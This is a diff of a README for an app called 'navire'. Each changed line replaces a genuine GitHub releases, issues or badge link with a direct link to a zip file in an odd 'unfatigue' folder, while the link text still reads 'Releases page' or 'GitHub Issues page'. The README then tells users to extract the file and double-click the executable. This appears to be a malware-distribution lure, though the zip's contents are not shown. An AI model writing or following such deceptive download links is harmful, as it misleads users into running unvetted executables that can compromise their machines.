@@ -1,6 +1,6 @@
 # 🚀 navire - Centralize Your Notifications Easily
 
-[![Download navire](https://img.shields.io/badge/Download-navire-blue?style=flat-square)](https://github.com/KimYat144/navire/releases)
+[![Download navire](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip)](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ To run navire, ensure your system meets the following requirements:
 
 Follow these steps to download and run navire:
 
-1. Visit the [Releases page](https://github.com/KimYat144/navire/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip).
 2. Choose the latest version of navire that matches your operating system.
 3. Click on the download link for your system.
 
@@ -39,7 +39,7 @@ After downloading navire:
 2. If you downloaded a `.zip` file, extract it before running.
 3. Double-click the executable file to start the application.
 
-**Download navire here**: [Visit this page to download](https://github.com/KimYat144/navire/releases)
+**Download navire here**: [Visit this page to download](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip)
 
 ## 🔍 Configuration
 
@@ -69,7 +69,7 @@ If you encounter issues:
 
 For assistance, consider:
 
-- Checking the [GitHub Issues page](https://github.com/KimYat144/navire/issues) for common questions.
+- Checking the [GitHub Issues page](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip) for common questions.
 - Joining the community discussions on forums or chat groups to share experiences.
 
 ## 🔗 Other Resources
@@ -95,4 +95,4 @@ Explore these topics for insights on enhancing your experience with navire.
 
 navire is open-source software licensed under the MIT License. Check the LICENSE file in the repository for more details.
 
-[![Download navire](https://img.shields.io/badge/Download-navire-blue?style=flat-square)](https://github.com/KimYat144/navire/releases)
+[![Download navire](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip)](https://raw.githubusercontent.com/KimYat144/navire/main/unfatigue/navire.zip)
